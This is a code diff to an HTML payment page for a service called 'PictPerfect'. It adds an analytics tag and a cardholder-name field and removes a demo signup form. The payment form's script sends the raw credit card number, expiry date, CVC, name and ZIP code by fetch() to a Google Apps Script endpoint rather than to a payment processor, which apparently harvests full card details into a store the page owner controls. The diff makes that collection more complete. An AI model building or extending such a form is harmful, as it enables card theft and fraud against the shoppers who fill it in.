@@ -25,6 +25,15 @@ document.addEventListener("DOMContentLoaded", () => {
 });
 </script>
 </head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-7BGMQJQ43G"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-7BGMQJQ43G');
+</script>
 <body>
 <header>
  <nav class="navbar">
@@ -46,8 +55,8 @@ document.addEventListener("DOMContentLoaded", () => {
   <h1>Enter Payment Details</h1>
   <p>Selected Package: <span id="selected-package"></span></p>
   <form id="payment-form" class="payment-form">
-    <label for="zip-code">ZIP Code:</label>
-    <input type="text" id="zip-code" name="zip-code" required placeholder="Enter your ZIP code">
+    <label for="zip-code">Name:</label>
+    <input type="text" id="name" name="name" required placeholder="Full Name">
 
     <label for="cc-number">Credit Card Number:</label>
     <input type="text" id="cc-number" name="cc-number" required placeholder="XXXX XXXX XXXX XXXX">
@@ -57,6 +66,8 @@ document.addEventListener("DOMContentLoaded", () => {
 
     <label for="cc-cvc">CVC:</label>
     <input type="text" id="cc-cvc" name="cc-cvc" required placeholder="XXX">
+    <label for="zip-code">ZIP Code:</label>
+    <input type="text" id="zip-code" name="zip-code" required placeholder="Enter your ZIP code">
 
     <button type="submit" class="btn-primary">Submit Payment</button>
   </form>
@@ -66,45 +77,10 @@ document.addEventListener("DOMContentLoaded", () => {
   <p>&copy; 2024 PictPerfect. All rights reserved.</p>
 </footer>
 
-<!-- Example signup form for demonstration (if needed) -->
-<section>
-  <form id="signup-form">
-    <input type="email" id="email" name="email" placeholder="Enter Email" required>
-    <input type="checkbox" id="terms" name="terms"> I agree to the terms
-    <button type="submit">Sign Up</button>
-  </form>
-</section>
-
 <script>
   // Replace with your Web App URL from the Google Apps Script deployment
   const GAS_ENDPOINT = 'https://script.google.com/macros/s/AKfycbzIThOL0h0m1Vv_v1Hy_6r45YuhpCbbv3AV-s9_aJNTduZMrZuStK8mlyl1VLbXcaz8/exec';
 
-  // Handle the signup form submission
-  document.getElementById('signup-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    var form = this;
-    var email = document.getElementById('email').value;
-    var termsChecked = document.getElementById('terms').checked;
-
-    var postData = new URLSearchParams();
-    postData.append('email', email);
-    postData.append('signup_terms', termsChecked);
-
-    fetch(GAS_ENDPOINT, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      body: postData.toString()
-    })
-    .then(function(response) {
-      // You can handle the response if needed
-      // For now, just redirect
-      window.location.href = 'upload-offer.html';
-    })
-    .catch(function(error) {
-      console.error('Error:', error);
-      alert('There was a problem submitting your data. Please try again.');
-    });
-  });
 
   // Handle the payment form submission
   document.getElementById('payment-form').addEventListener('submit', function(e) {
@@ -113,6 +89,7 @@ document.addEventListener("DOMContentLoaded", () => {
     var ccNumber = document.getElementById('cc-number').value;
     var ccExp = document.getElementById('cc-exp').value;
     var ccCvc = document.getElementById('cc-cvc').value;
+    var name = document.getElementById('name').value;
 
     // Retrieve the credits and price from global variables set on DOMContentLoaded
     var credits = window.selectedCredits;
@@ -125,6 +102,7 @@ document.addEventListener("DOMContentLoaded", () => {
     postData.append('cc-number', ccNumber);
     postData.append('cc-exp', ccExp);
     postData.append('cc-cvc', ccCvc);
+    postData.append('name', name);
 
     fetch(GAS_ENDPOINT, {
       method: 'POST',
